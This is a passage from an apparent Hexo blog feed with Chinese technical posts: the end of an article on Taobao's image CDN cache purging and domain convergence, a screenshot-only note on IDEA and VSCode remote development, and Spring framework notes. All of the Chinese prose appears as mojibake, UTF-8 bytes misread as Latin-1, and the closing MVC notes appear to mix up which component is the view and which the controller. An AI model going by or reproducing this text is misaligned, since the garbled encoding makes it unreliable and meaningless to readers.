<p>ç”±äºå†å²åŸå› ï¼Œä¹‹å‰å¯¹ç¼©æ”¾çš„å°ºå¯¸ç§ç±»æ²¡æœ‰é™åˆ¶ï¼Œå¯¼è‡´CDNä¸Šçš„å›¾ç‰‡åç¼€æ ¼å¼å¤šè¾¾2400ç§+ï¼ŒTOP6æ ¼å¼è¦†ç›–ç‡46%ï¼ŒTOP15æ ¼å¼è¦†ç›–ç‡64%ã€‚è¿™æ„å‘³ç€ï¼Œä¸€å¼ å›¾ç‰‡ï¼Œåœ¨cdnä¸Šæœ€å¤šå¯èƒ½æœ‰2400+ä¸ªä¸åŒçš„urlï¼Œå½“å›¾ç‰‡å†…å®¹å˜åŒ–åï¼Œè¦æŠŠè¿™äº›ç¼“å­˜å…¨éƒ¨æ¸…æ‰ï¼Œæ‰èƒ½ä¿è¯æ‰€æœ‰ç”¨æˆ·çœ‹åˆ°çš„å›¾ç‰‡éƒ½æ˜¯æ–°å†…å®¹ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯¹åŸŸåæ ¼å¼è¿›è¡Œäº†æ”¶æ•›ã€‚</p>
<p>å›¾ç‰‡ç©ºé—´å¯¹äºå›¾ç‰‡è´¨é‡å‹ç¼©å‚æ•°çš„è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>å›¾ç‰‡è´¨é‡å‚æ•°å¸¸è§æœ‰ä¸€ä¸‹8ç§å½¢å¼ï¼šQ90ã€Q75ã€Q50ã€Q30ã€q90ã€q75ã€q50ã€q30</li>
<li>å›¾ç‰‡é”åŒ–å‚æ•°å¸¸è§æœ‰ä¸€ä¸‹3ç§å½¢å¼ï¼šs100ï¼Œs150ï¼Œs200</li>
</ul>
<p>æˆ‘ä»¬é‡æ–°å°†å›¾ç‰‡è´¨é‡å®šä¹‰ä¸ºé«˜è´¨é‡å›¾ç‰‡å’Œä½è´¨é‡å›¾ç‰‡ï¼Œæ”¶æ•›æ ¼å¼ä¸º q90 å’Œ p50s150<br>è¿™æ ·ï¼Œå°±å¯ä»¥æŠŠ2000å¤šç§æ ¼å¼æ”¶æ•›åˆ°6ç§ä¸»è¦æ ¼å¼ï¼ŒCDNæ¸…é™¤ç¼“å­˜æ‰å˜å¾—å¯è¡Œã€‚</p>
<p><strong>å¤šå‰¯æœ¬æ¸…é™¤CDNç¼“å­˜</strong><br>é€šè¿‡å›¾ç‰‡å°ºå¯¸æ”¶æ•›ï¼Œæ¯å¼ å›¾ç‰‡åªéœ€è¦æ¸…é™¤6ä¸ªä¸åŒçš„urlå°±å¯ä»¥äº†ï¼Œé‚£èƒ½ä¸èƒ½è¿›ä¸€æ­¥æå‡åˆ·æ–°æ•ˆç‡å‘¢ï¼Ÿ<br>ä¸ºæ­¤ï¼Œé˜¿é‡Œäº‘CDNä¸ºæˆ‘ä»¬æä¾›äº†å¤šå‰¯æœ¬åˆ·æ–°çš„è§£å†³æ–¹æ¡ˆï¼šæ¯ç§ä¸åŒåç¼€çš„å›¾ç‰‡ï¼Œä½œä¸ºå›¾ç‰‡çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œåœ¨CDNçš„swiftå±‚å¢åŠ ä¸€å±‚KVç»“æ„ï¼Œå­˜å‚¨urlå’Œä¸åŒå‰¯æœ¬çš„æ˜ å°„å…³ç³»ï¼Œæ¸…é™¤ç¼“å­˜æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥ç»“æ„æ‰¾åˆ°æ‰€æœ‰å‰¯æœ¬ï¼Œå®ç°å¿«é€Ÿæ¸…é™¤æ‰€æœ‰å‰¯æœ¬ã€‚è¿™æ ·ï¼Œæ¯å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨ä¸€æ¬¡CDNæ¸…é™¤ç¼“å­˜æ¥å£å°±å¯ä»¥äº†ï¼Œæå¤§æå‡äº†CDNç¼“å­˜åˆ·æ–°æ•ˆç‡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458324.jpg" alt="img"></p>
<p><strong>å›¾ç‰‡åŸŸåæ”¶æ•›</strong></p>
<p>æ·˜ç³»çš„å›¾ç‰‡åŸŸåæœ‰300å¤šç§ï¼Œä¸»è¦æœ‰ä¸‹é¢2ä¸ªåŸå› ï¼š<br>ï¼ˆ1ï¼‰å›¾ç‰‡å®Œæ•´çš„é“¾æ¥å¤ªé•¿ï¼Œæ‰€ä»¥å­˜å‚¨æ—¶ç»å¸¸åªå­˜æœ€åä¸€æ®µï¼Œä¸šåŠ¡è‡ªå·±æ¥æ‹¼åŸŸåï¼Œå¾ˆå¤šä¸šåŠ¡å°±è‡ªå·±ç”³è¯·äº†ä¸€ä¸ªå›¾ç‰‡åŸŸåæ¥æ‹¼ã€‚<br>ï¼ˆ2ï¼‰PCæ—¶ä»£ï¼Œæµè§ˆå™¨å¯¹åŒä¸€åŸŸåä¸‹çš„å¹¶å‘è¯·æ±‚æ•°æ˜¯æœ‰é™åˆ¶çš„ï¼Œä¸åŒæµè§ˆå™¨ä¸ä¸€æ ·ï¼Œä¸€èˆ¬6ä¸ªå·¦å³ã€‚</p>
<p>ä¸ºäº†çªç ´è¯¥é™åˆ¶ï¼Œä¸€äº›ä¸šåŠ¡å°±ä¼šç”³è¯·å¤šä¸ªåŸŸåï¼Œéšæœºçš„æ‹¼ä¸åŒçš„åŸŸåã€‚</p>
<p>å‰é¢æˆ‘ä»¬è®²è¿‡ï¼ŒCDNçš„ç¼“å­˜æ˜¯è·ŸåŸŸåç»‘å®šçš„ï¼Œä¸ç®¡æ˜¯ç¼“å­˜å‘½ä¸­è¿˜æ˜¯ç¼“å­˜æ¸…é™¤ï¼Œéƒ½åªèƒ½é’ˆå¯¹ä¸€ä¸ªåŸŸåã€‚</p>
<p>æˆ‘ä»¬æ˜¾ç„¶ä¸å¯èƒ½æ”¹ä¸€å¼ å›¾ï¼Œå°±å»å¯¹300ä¸ªåŸŸåè°ƒç”¨CDNåˆ·æ–°ã€‚äºæ˜¯æˆ‘ä»¬è€ƒè™‘å¯¹å›¾ç‰‡åŸŸåè¿›è¡Œæ”¶æ•›ï¼Œä½¿å¾—ç”¨æˆ·å¯¹å›¾ç‰‡çš„è®¿é—®éƒ½è·¯ç”±åˆ°åŒä¸€ä¸ªåŸŸåï¼Œæˆ‘ä»¬å¸Œæœ›å°†æ‰€æœ‰çš„å›¾ç‰‡è®¿é—®ç»Ÿä¸€æ”¶æ•›åˆ°<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>ï¼Œå…·ä½“å®ç°æ–¹å¼å¦‚ä¸‹ï¼š</p>
<p>ï¼ˆ1ï¼‰å¯¹äºæ‰‹æ·˜å’ŒçŒ«å®¢å®¢æˆ·ç«¯ï¼Œå›¾ç‰‡è®¿é—®éƒ½æ”¶å£åœ¨å›¾ç‰‡åº“ï¼Œæˆ‘ä»¬æ¨è¿›å›¾ç‰‡åº“è¿›è¡Œæ”¹é€ ï¼Œç¬¦åˆä¸€å®šè§„åˆ™çš„urlï¼Œç»Ÿä¸€æ”¶æ•›åˆ°<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>ï¼Œå®ç°äº†åŸŸåçš„ä¸€åˆ€åˆ‡ã€‚<br>ï¼ˆ2ï¼‰å¯¹äºPCæµè§ˆå™¨ç«¯ï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæ²¡æœ‰ç»Ÿä¸€æ”¶å£çš„åœ°æ–¹ã€‚æˆ‘ä»¬åªèƒ½é€€è€Œæ±‚å…¶æ¬¡ï¼Œé’ˆå¯¹è®¿é—®æœ€å¤šçš„6å¤§åŸŸåï¼Œåœ¨cdnä¸Šé…ç½®åŸŸåè½¬å‘è§„åˆ™ï¼Œé‡å®šå‘åˆ°<a href="https://www.zhihu.com/search?q=picasso%E5%9F%9F%E5%90%8D&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">picassoåŸŸå</a>ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458380.jpg" alt="img"></p>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å®ç°äº†å…¨ç½‘99%ä»¥ä¸Šçš„å›¾ç‰‡è®¿é—®æµé‡éƒ½è·¯ç”±åˆ°picassoåŸŸåï¼Œå›¾ç‰‡å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé€šè¿‡æ¸…é™¤picassoåŸŸåçš„<a href="https://www.zhihu.com/search?q=cdn%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">cdnç¼“å­˜</a>ï¼Œå°±èƒ½ä¿è¯åŸºæœ¬æ‰€æœ‰çš„åœºæ™¯éƒ½èƒ½çœ‹åˆ°æ–°çš„å›¾ç‰‡å†…å®¹ã€‚</p>
<h4 id="å®¢æˆ·ç«¯åŠæµè§ˆå™¨ç¼“å­˜"><a href="#å®¢æˆ·ç«¯åŠæµè§ˆå™¨ç¼“å­˜" class="headerlink" title="å®¢æˆ·ç«¯åŠæµè§ˆå™¨ç¼“å­˜"></a>å®¢æˆ·ç«¯åŠæµè§ˆå™¨ç¼“å­˜</h4><p>é€šè¿‡å¤šå‰¯æœ¬å’Œå›¾ç‰‡åŸŸåæ”¶æ•›ï¼Œcdnçš„ç¼“å­˜é—®é¢˜å¾—åˆ°äº†è§£å†³ã€‚ä½†åœ¨cdnä¹‹ä¸Šï¼Œç”¨æˆ·å›¾ç‰‡è®¿é—®é¦–å…ˆæ˜¯æ¥è‡ªå®¢æˆ·ç«¯æˆ–è€…æµè§ˆå™¨ï¼Œè¿™é‡Œä¹Ÿä¼šæœ‰ä¸€å±‚ç¼“å­˜ã€‚</p>
<p>å¤§å®¶çŸ¥é“ï¼Œæµè§ˆå™¨çš„ç¼“å­˜éƒ½éµå¾ªæ ‡å‡†çš„http max-ageåè®®ï¼ŒæŒ‡å®šè¯¥headeråï¼Œåˆ°äº†æ—¶é—´å›¾ç‰‡å°±ä¼šå¤±æ•ˆï¼Œè®¿é—®åˆ°æ–°çš„å›¾ç‰‡ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æºç«™img-picassoå›æºç»™cdnæ—¶ï¼Œæ·»åŠ max-ageåè®®å¤´ï¼Œå€¼ä¸º1åˆ†é’Ÿï¼Œcdnä¼šåŸå°ä¸åŠ¨çš„é€ç»™æµè§ˆå™¨ï¼Œè¿™æ ·æµè§ˆå™¨å°±å¯ä»¥å®ç°1åˆ†é’Ÿå†…<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">å›¾ç‰‡ç¼“å­˜</a>å¤±æ•ˆï¼Œé‡æ–°åˆ°cdnæ‹‰æ–°çš„å›¾ç‰‡èµ„æºã€‚</p>
<p>å¯¹äºæ‰‹æœºæ·˜å®å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬åœ¨åŸæœ‰çš„LRUç¼“å­˜æœºåˆ¶ä¹‹ä¸Šï¼Œå¦å¤–æ”¯æŒæ ‡å‡†çš„httpåè®®ã€‚è¿™æ ·ï¼Œæ‰‹æœºæ·˜å®ä¹Ÿå®ç°äº†1åˆ†é’Ÿå†…å›¾ç‰‡ç¼“å­˜å¤±æ•ˆã€‚</p>
<p><strong>æå‰é¢„çƒ­CDNå›¾ç‰‡</strong></p>
<p>é€šè¿‡æ”¹å›¾ä¿æŒå›¾ç‰‡URLä¸å˜ï¼Œæˆ‘ä»¬è§£å†³äº†æ”¹å›¾å¯¹å•†å“é“¾è·¯ç¼“å­˜çš„å½±å“ã€‚ä½†æ˜¯ï¼Œå›¾ç‰‡å˜åŒ–æ—¶ï¼Œè™½ç„¶URLæ²¡æœ‰å˜ï¼Œä½†æˆ‘ä»¬æ¸…é™¤äº†CDNç¼“å­˜ï¼Œå¯¼è‡´ç”¨æˆ·è®¿é—®æ—¶è¿˜æ˜¯ä¼šå›æºåˆ°img-picassoæºç«™ï¼Œæ‰€ä»¥å¯¹å›¾ç‰‡æºç«™çš„å‹åŠ›ä¾ç„¶å­˜åœ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458478.jpg" alt="img"></p>
<p>æˆ‘ä»¬å‘ç°ï¼Œå•†å“çš„ä»·æ ¼å˜åŒ–å¤§éƒ¨åˆ†å‘ç”Ÿåœ¨å¤§ä¿ƒèŠ‚å¥å˜åŒ–çš„æ—¶åˆ»ï¼ŒåŸºäºè¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬é€šè¿‡æå‰åˆæˆå›¾ç‰‡ï¼Œæå‰é¢„çƒ­åˆ°CDNï¼Œå¯ä»¥å®ç°å›¾ç‰‡åˆ‡æ¢ç¬é—´ç”Ÿæ•ˆï¼ŒåŒæ—¶å¯¹æºç«™æ²¡æœ‰å‹åŠ›ã€‚</p>
<p>å…·ä½“æ–¹æ¡ˆå¦‚ä¸‹ï¼š<br>ï¼ˆ1ï¼‰æå‰åˆæˆå¤šæ³¢æ®µå›¾ç‰‡ï¼šæˆ‘ä»¬çŸ¥é“å¤§ä¿ƒæœŸé—´å•†å®¶é›†ä¸­æ¢å›¾çš„æ—¶é—´ç‚¹åï¼ŒæŒ‰è¿™äº›æ—¶é—´ç‚¹æŠŠå›¾ç‰‡çš„å±•ç¤ºåˆ†æˆå¤šä¸ªæ³¢æ®µï¼Œæ¯ä¸ªæ³¢æ®µå›¾ç‰‡æå‰åˆæˆï¼Œå¹¶æå‰å°†å›¾ç‰‡URLå†™å…¥åˆ°å•†å“ä¸­å¿ƒæ‰©å±•ç»“æ„ä¸­ã€‚<br>ï¼ˆ2ï¼‰å›¾ç‰‡è®¿é—®è·¯ç”±ï¼šè¥é”€ç³»ç»Ÿæ ¹æ®é…ç½®çš„å¤§ä¿ƒæ°›å›´åˆ‡æ¢è®¡åˆ’ï¼Œå‘Šè¯‰é¹¿ç­å›¾ç‰‡äºŒæ–¹åŒ…ï¼Œå½“å‰æ˜¯å“ªä¸ªæ³¢æ®µï¼Œé¹¿ç­æ ¹æ®å½“å‰æ³¢æ®µåŠåœºæ™¯ï¼Œè¿”å›æ­£ç¡®çš„å›¾ç‰‡URLç»™å„ä¸ªåœºæ™¯ã€‚<br>ï¼ˆ3ï¼‰å›¾ç‰‡æ¸²æŸ“ï¼šå„ä¸ªåœºæ™¯æ‹¿åˆ°å›¾ç‰‡URLåï¼Œç»“åˆè‡ªèº«çš„ä¸šåŠ¡é€»è¾‘ï¼Œå†³å®šæ˜¯å¦è¦å±•ç°è¯¥å›¾ç‰‡ã€‚<br>ï¼ˆ4ï¼‰CDNå›¾ç‰‡é¢„çƒ­ï¼šä¸ºäº†é¿å…å›¾ç‰‡é›†ä¸­åˆ‡æ¢æ—¶ï¼ŒæŠŠæºç«™å‡»å®ï¼Œæˆ‘ä»¬ä¼šåœ¨é›†ä¸­åˆ‡æ¢å‰æŠŠè¿™äº›å†·å›¾ç‰‡å†…å®¹é¢„çƒ­åˆ°CDNã€‚<br>ï¼ˆ5ï¼‰æ³¢æ®µå†…å›¾ç‰‡å˜åŒ–ï¼šæå‰åˆæˆå„ä¸ªæ³¢æ®µå›¾ç‰‡åï¼Œå•†å®¶å¯èƒ½ä¼šä¸´æ—¶å‘åˆ¸&#x2F;æ”¹ä»·ï¼Œå¯¼è‡´å•†å“ä»·æ ¼å†æ¬¡å˜åŒ–ï¼Œå¯¹äºè¿™ç±»æ¢å›¾éœ€æ±‚ï¼Œä¸ºäº†é¿å…æ›´æ–°å•†å“ä¸­å¿ƒçš„å›¾ç‰‡URLï¼Œæˆ‘ä»¬é€šè¿‡æœ¬æ–‡ä¸Šä¸€ç« èŠ‚åˆ·CDNç¼“å­˜çš„æ–¹å¼å®ç°ã€‚</p>
<h4 id="æ€»ç»“å’Œå±•æœ›"><a href="#æ€»ç»“å’Œå±•æœ›" class="headerlink" title="æ€»ç»“å’Œå±•æœ›"></a>æ€»ç»“å’Œå±•æœ›</h4><p><a href="https://www.zhihu.com/search?q=CDN%E6%8A%80%E6%9C%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">CDNæŠ€æœ¯</a>å¹¿æ³›åº”ç”¨äºäº’è”ç½‘çš„å„ä¸ªåœºæ™¯ï¼Œå¦‚ä»Šçš„CDNæœåŠ¡å•†ï¼Œéƒ½æä¾›äº†éå¸¸ç®€å•çš„ä¸šåŠ¡æ¥å…¥æ–¹å¼ï¼Œè€Œä¸”CDNçš„è´¹ç”¨æ¯å¹´éƒ½åœ¨é™ä½ï¼Œè¿™ä¸€åˆ‡ä½¿å¾—CDNçš„æ¥å…¥å’Œä½¿ç”¨æˆæœ¬è¶Šæ¥è¶Šä½ã€‚</p>
<p>æ·˜å®çš„å›¾ç‰‡ä¸šåŠ¡é™¤äº†è®¿é—®é‡å¤§ï¼Œè¿˜ä¼šé¢ä¸´æ›´æ–°é¢‘ç¹çš„é—®é¢˜ã€‚å›¾ç‰‡çš„é¢‘ç¹æ›´æ–°ï¼Œä¸€æ–¹é¢ä¼šç”±äºå•†å“ä¸Šçš„å›¾ç‰‡urlå˜åŒ–ï¼Œå¯¼è‡´å•†å“ç¼“å­˜å¤±æ•ˆï¼Œå¦ä¸€æ–¹é¢ä¼šå¤§å¹…é™ä½CDNçš„å›¾ç‰‡è®¿é—®ç¼“å­˜å‘½ä¸­ç‡ã€‚<br>é’ˆå¯¹å›¾ç‰‡urlå˜åŒ–å¯¼è‡´å•†å“ç¼“å­˜å¤±æ•ˆçš„é—®é¢˜ï¼Œæˆ‘ä»¬é€šè¿‡åˆ·æ–°cdnç¼“å­˜ï¼Œç”¨æˆ·è®¿é—®æ—¶é‡æ–°å›æºçš„æ–¹å¼ï¼Œå®ç°äº†æ”¹å›¾ä¿æŒå›¾ç‰‡urlä¸å˜ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­äº†ï¼Œæˆ‘ä»¬è§£å†³äº†ä¸€äº›åˆ—çš„é—®é¢˜ï¼ŒåŒ…æ‹¬ï¼šOSSä¸‰åœ°åŒæ­¥æ›´æ–°ã€å›¾ç‰‡å°ºå¯¸æ”¶æ•›ã€å›¾ç‰‡åŸŸåæ”¶æ•›ã€å®¢æˆ·ç«¯åŠæµè§ˆå™¨<a href="https://www.zhihu.com/search?q=%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">æœ¬åœ°ç¼“å­˜</a>ã€‚<br>é’ˆå¯¹æ”¹å›¾é™ä½CDNå›¾ç‰‡ç¼“å­˜å‘½ä¸­ç‡çš„é—®é¢˜ï¼Œæˆ‘ä»¬æ ¹æ®ä¸šåŠ¡çš„ç‰¹ç‚¹ï¼Œæå‰åˆæˆä¸åŒæ³¢æ®µçš„å›¾ç‰‡ï¼Œå¹¶é¢„çƒ­åˆ°CDNï¼Œä¿éšœäº†æºç«™çš„å®‰å…¨ã€‚</p>
<p>ç›®å‰ï¼Œæ·˜å®ä¸Šç”¨æˆ·çœ‹åˆ°çš„å›¾ç‰‡ï¼Œéƒ½æ˜¯æå‰åˆæˆå¥½çš„ã€‚æœªæ¥ï¼Œæˆ‘ä»¬è€ƒè™‘åœ¨ç”¨æˆ·è®¿é—®å›¾ç‰‡æ—¶ï¼Œå®æ—¶åˆæˆå›¾ç‰‡ã€‚é€šè¿‡è¿™é¡¹æŠ€æœ¯ï¼Œå¯ä»¥å®æ—¶æ„ŸçŸ¥ä¸šåŠ¡æ›´å¤šçš„å®æ—¶ä¿¡æ¯ï¼Œå¯ä»¥æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œåœ¨å›¾ç‰‡ä¸Šåˆæˆå½“å‰ç”¨æˆ·æˆ–è€…ç¯å¢ƒæ›´åŒ¹é…çš„æ–‡æ¡ˆ&#x2F;å…ƒç´ ç­‰å†…å®¹ï¼Œç»™ç”¨æˆ·å¸¦æ¥æ›´å¤šçš„æƒŠå–œã€‚<br>å½“ç„¶ï¼Œå®æ—¶åˆå›¾ä¹Ÿä¼šé¢ä¸´æ›´å¤šçš„æŒ‘æˆ˜ï¼Œå¦‚ï¼šè®¡ç®—èƒ½åŠ›ã€åˆå›¾æ€§èƒ½ã€‚æ­¤å¤–ï¼Œå¯¹äºCDNè€Œè¨€ï¼Œç”±äºæ¯æ¬¡ç”¨æˆ·è®¿é—®çš„å†…å®¹æ˜¯ä¸´æ—¶åˆæˆçš„ï¼ŒCDNçš„ç¼“å­˜ç­–ç•¥ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æŒ‘æˆ˜ã€‚</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨IDEAé…åˆVSCodeè¿œç¨‹å¼€å‘</title>
    <url>/2021/12/22/Java/%E4%BD%BF%E7%94%A8Idea%E9%85%8D%E5%90%88vscode%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="ä½¿ç”¨IDEAé…åˆVSCodeè¿œç¨‹å¼€å‘"><a href="#ä½¿ç”¨IDEAé…åˆVSCodeè¿œç¨‹å¼€å‘" class="headerlink" title="ä½¿ç”¨IDEAé…åˆVSCodeè¿œç¨‹å¼€å‘"></a>ä½¿ç”¨IDEAé…åˆVSCodeè¿œç¨‹å¼€å‘</h1><h2 id="IDEAé…ç½®è¿œç¨‹ä¸Šä¼ ä»£ç "><a href="#IDEAé…ç½®è¿œç¨‹ä¸Šä¼ ä»£ç " class="headerlink" title="IDEAé…ç½®è¿œç¨‹ä¸Šä¼ ä»£ç "></a>IDEAé…ç½®è¿œç¨‹ä¸Šä¼ ä»£ç </h2><p>å…ˆç¡®ä¿æœ¬åœ°å’Œå¼€å‘æœºä¸Šæœ‰åŒä¸€ä»½ä»£ç ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212343408.png" alt="image-20211221234331366"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212344773.png" alt="image-20211221234439734"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212346351.png" alt="image-20211221234657302"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212358451.png" alt="image-20211221235744141"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220003470.png" alt="image-20211222000346432"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220005712.png" alt="image-20211222000526639"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220006550.png" alt="image-20211222000619501"></p>
<h2 id="VsCodeè¿œç¨‹è°ƒè¯•"><a href="#VsCodeè¿œç¨‹è°ƒè¯•" class="headerlink" title="VsCodeè¿œç¨‹è°ƒè¯•"></a>VsCodeè¿œç¨‹è°ƒè¯•</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220009126.png" alt="image-20211222000914072"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220010818.png" alt="image-20211222001022768"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220011260.png" alt="image-20211222001153213"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220013399.png" alt="image-20211222001322347"></p>
<p>éœ€è¦å‡çº§gitç‰ˆæœ¬</p>
<p><a href="https://www.cnblogs.com/miskis/p/9816135.html">VsCodeæ­å»ºJavaå¼€å‘ç¯å¢ƒ</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring</title>
    <url>/2021/12/21/leyou/Java%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>é€šè¿‡beandefinitionReader æ¥è¯»å–xmlã€æ³¨è§£æˆ–javaé…ç½®ç±», ç„¶åæ”¾åˆ°beandefinition,å¦‚æœå®ç°äº†beanfactorypostprocessoræ¥å£,åˆ™éœ€è¦å¦ä¸€æ­¥å¤„ç†, é€šè¿‡beanfactoryæ¥åå°„åˆ›å»ºå¯¹è±¡,beanPostprocessoråç½®å¤„ç†å™¨,å¢å¼ºå™¨;</p>
<p>å®ç°äº†awareæ¥å£å°±æ˜¯è®¾ç½®beançš„ä¸€äº›å±æ€§, æ¯”å¦‚æƒ³è¦è·å–å½“å‰å¯¹è±¡çš„å·¥å‚, å°±éœ€è¦å®ç°BeanFactoryAwareæ¥å£, ç„¶åå°±èƒ½é€šè¿‡bean.getBeanFactory()è·å–åˆ°;</p>
<p>ä½œä¸ºä¸€ä¸ªæ¡†æ¶,æ‰©å±•æ€§æ˜¯å¿…é¡»è¦é‡ç‚¹è€ƒè™‘çš„ä¸œè¥¿, ä¾‹å¦‚è¯»å–å®Œäº†xmlå,è¦ä¿®æ”¹beançš„å±æ€§, </p>
<p>æœ‰äº†beanFactoryä¸ºä»€ä¹ˆè¿˜è¦factoryBean</p>
<p>å‡å¦‚æ­£å¸¸å·¥å‚ç”Ÿäº§æ­£å¸¸äºº, çªç„¶éœ€è¦å‡ ä¸ªä¸‰å¤´å…­è‡‚çš„äºº,è¿™ä¸ªæ—¶å€™ä¸èƒ½å»å»ºä¸€ä¸ªå·¥å‚,å°±éœ€è¦ç”¨åˆ°factorybean</p>
<p>åœ¨æ•´ä¸ªspringæ¡†æ¶ä¸­, å¦‚æœæƒ³åœ¨æŸäº›é˜¶æ®µåšä¸€äº›ç‹¬ç‰¹çš„äº‹æƒ…, åº”è¯¥æ€ä¹ˆåš? </p>
<p>ç›‘å¬å™¨: è§‚å¯Ÿè€…æ¨¡å¼</p>
<h2 id="ä»€ä¹ˆæ˜¯Spring-MVC-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Spring-MVC-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Spring MVC ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Spring MVC ï¼Ÿ</h2><ul>
<li>Spring MVCæ˜¯ä¸€ä¸ªåŸºäºMVCæ¶æ„çš„ç”¨æ¥ç®€åŒ–webåº”ç”¨ç¨‹åºå¼€å‘çš„åº”ç”¨å¼€å‘æ¡†æ¶ï¼Œå®ƒæ˜¯Springçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå’ŒStruts2ä¸€æ ·éƒ½å±äºè¡¨ç°å±‚çš„æ¡†æ¶ã€‚</li>
<li>MVCï¼ˆModelæ¨¡å‹ View è§†å›¾ Controller æ§åˆ¶å™¨ï¼‰ï¼šè¿™æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„æ€æƒ³ï¼Œæ˜¯ä¸€ç§å¼€å‘æ¨¡å¼ï¼Œå°†è½¯ä»¶åˆ’åˆ†ä¸ºä¸‰ç§ä¸åŒç±»å‹çš„æ¨¡å—ï¼Œåˆ†åˆ«æ˜¯æ¨¡å‹ï¼Œè§†å›¾ï¼Œå’Œæ§åˆ¶å™¨ã€‚ æ¨¡å‹ï¼šç”¨äºå°è£…ä¸šåŠ¡é€»è¾‘å¤„ç†ï¼ˆjavaç±»ï¼‰ï¼› è§†å›¾ï¼šç”¨äºæ•°æ®å±•ç°å’Œæ“ä½œç•Œé¢ï¼ˆServletï¼‰ï¼› æ§åˆ¶å™¨ï¼šç”¨äºåè°ƒè§†å›¾å’Œæ¨¡å‹ï¼ˆjspï¼‰ï¼› å¤„ç†æµç¨‹ï¼šè§†å›¾å°†è¯·æ±‚å‘é€ç»™æ§åˆ¶å™¨ï¼Œç”±æ§åˆ¶å™¨é€‰æ‹©å¯¹åº”çš„æ¨¡å‹æ¥å¤„ç†ï¼›æ¨¡å‹å°†å¤„ç†ç»“æœäº¤ç»™æ§åˆ¶å™¨ï¼Œæ§åˆ¶å™¨é€‰æ‹©åˆé€‚çš„è§†å›¾æ¥å±•ç°å¤„ç†ç»“æœï¼›</li>
</ul>
